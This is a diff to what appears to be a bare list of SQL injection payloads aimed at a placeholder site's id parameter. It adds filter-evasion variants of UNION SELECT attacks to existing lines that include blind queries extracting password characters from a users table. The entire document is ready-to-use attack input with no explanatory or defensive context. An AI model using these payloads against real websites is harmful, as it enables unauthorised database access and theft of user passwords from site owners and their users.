@@ -7,7 +7,7 @@ www.site.com/home.php?id=-2%20Union%20Select%201,2,3--
 www.site.com/home.php?id=-2‘ and (select substr(group_concat(pass),1,1) from users)=’a
 www.site.com/home.php?id=-2‘ and substr((select max(pass) from users),1,1)=’a
 www.site.com/home.php?id=-2‘ and substr((select max(replace(pass,’lastpw’,”)) from users),1,1)=’a
-www.site.com/home.php?id=-2 0/**/union/*!50000select*/
+www.site.com/home.php?id=-2 0/**/union/*!50000select*/ 1,2,3--
 www.site.com/home.php?id=-2‘||1=’1
 www.site.com/home.php?id=-2‘&&1=’1
 www.site.com/home.php?id=-2 or 1=convert(int,(USER))--
@@ -15,3 +15,6 @@ www.site.com/home.php?id=-2 %00%20union select 1,2,3--
 www.site.com/home.php?id=-2 and 8<>200--
 www.site.com/home.php?id=-2' like 90=90'--+-
 www.site.com/home.php?id=-2 \0%20union select 1,2,3--
+www.site.com/home.php?id=-2%27+having+1%3D1--+
+www.site.com/home.php?id=-2%%2727UniOn+sEleCt+1,2,3%00--+-
+www.site.com/home.php?id=-2%%2075%%6E6E%%6969%%6F6F%%6E6E%20%%7373%%6565%%6C6C%%6565%%6363%%7474%20%%3131%%2C2C%%3232%%2C2C%%3333
